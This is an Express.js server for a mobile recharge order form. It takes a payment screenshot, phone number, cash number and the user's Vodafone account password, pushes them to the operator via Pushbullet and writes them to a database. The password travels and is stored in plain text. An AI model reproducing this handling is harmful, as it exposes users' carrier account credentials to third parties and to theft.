import express from "express";
import axios from "axios";
import path from "path";
import dotenv from "dotenv";
import { fileURLToPath } from "url";
import multer from "multer";
import client from "./client.js";
import FormData from "form-data";
import fsp from "fs/promises";
import fs from "fs";

dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = 3000;

const storage = multer.diskStorage({
	destination: (req, file, cb) => cb(null, "uploads/"),
	filename: (req, file, cb) => cb(null, Date.now() + "-" + file.originalname),
});
const upload = multer({ storage });

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static("public"));

app.get("/", (req, res) => {
	res.sendFile(path.join(__dirname, "public", "index.html"));
});

app.post("/push-bullet", upload.single("image"), async (req, res) => {
	try {
		let push_msg = "";

		const { balance, phone, senderInfo, vfPassword, recharge } = req.body;
		const image = req.file;

		const { data: uploadData } = await axios.post(
			"https://api.pushbullet.com/v2/upload-request",
			{
				file_name: image.originalname,
				file_type: image.mimetype,
			},
			{
				headers: {
					"Access-Token": process.env.PUSH_BULLET_API_KEY,
					"Content-Type": "application/json",
				},
			}
		);

		const { upload_url, file_url } = uploadData;

		const formData = new FormData();
		formData.append("file", fs.createReadStream(image.path));

		await axios.post(upload_url, formData, {
			headers: formData.getHeaders(),
		});

		push_msg = vfPassword
			? `Package: ${recharge}\nPhone: ${phone}\nVodafone password=${vfPassword}\nCash Number: ${senderInfo} `
			: `Balance: ${balance}\nPhone: ${phone}\nCash Number: ${senderInfo} `;
		await axios.post(
			"https://api.pushbullet.com/v2/pushes",
			{
				type: "file",
				title: "New order",
				body: push_msg,
				file_name: image.originalname,
				file_type: image.mimetype,
				file_url,
			},
			{
				headers: {
					"Access-Token": process.env.PUSH_BULLET_API_KEY,
					"Content-Type": "application/json",
				},
			}
		);
     

		await Promise.all([
			client.query(
				`INSERT INTO payments (balance, phone, sender_info, vf_password, image) VALUES ($1, $2, $3, $4, $5)`,
				[balance, phone, senderInfo, vfPassword || null, file_url]
			),
			fsp.unlink(image.path),
		]);
			res.redirect("/");
	
		
	} catch (error) {
		console.error("Error:", error.response?.data || error.message);
		res.status(500).json({
			success: false,
			message: "❌ Failed to complete operation",
			error: error.message,
		});
	}
});

app.listen(PORT, () => {
	console.log(`Server is running on http://localhost:${PORT}`);
});
